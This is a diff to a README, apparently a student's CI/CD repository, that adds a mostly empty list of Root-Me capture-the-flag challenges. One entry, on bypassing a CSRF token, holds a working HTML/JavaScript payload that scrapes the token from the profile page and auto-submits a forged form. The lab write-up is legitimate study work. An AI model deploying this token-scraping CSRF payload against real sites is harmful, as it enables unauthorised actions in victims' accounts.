@@ -122,3 +122,73 @@ jobs:
 
 
 ```
+
+## Challenges
+
+### 1 |
+
+### 2 | PHP Filters
+
+### 3 | CSRF Contournement de Jeton
+
+Création d'un compte :
+
+![Step 1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/CSRF_contournement_de_jeton/1.png)
+
+Récupération du template du formulaire de profil utilisateur :
+
+![Step 2](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/CSRF_contournement_de_jeton/2.png)
+
+Payload :
+
+```html
+<html>
+    <form id="profile" action="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile" method="post" enctype="multipart/form-data">
+        <div>
+            <label>Username:</label>
+            <input id="username" type="text" name="username" value="change_me_user">
+        </div>
+        <br>		
+        <div>
+            <label>Status:</label>
+            <input id="status" type="checkbox" name="status" checked>
+        </div>
+        <br>
+        <input id="token" type="hidden" name="token" value="" />
+        <button type="submit">Submit</button>
+    </form>
+
+    <script>
+        const request = new XMLHttpRequest();
+        request.open('GET', 'http://challenge01.root-me.org/web-client/ch23/index.php?action=profile', false);
+        request.send();
+
+        const token = (request.responseText.match(/name="token" value="([a-zA-Z0-9]+)"/))[1];
+
+        const tokenField = document.getElementById('token')
+        tokenField.setAttribute('value', token)
+
+        const form = document.getElementById('profile');
+        form.submit();
+    </script>
+</html>
+
+```
+
+![Step 2](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/CSRF_contournement_de_jeton/2.png)
+
+### 4 |
+
+### 5 |
+
+### 6 |
+
+### 7 |
+
+### 8 |
+
+### 9 |
+
+### 10 |
+
+### 11 |
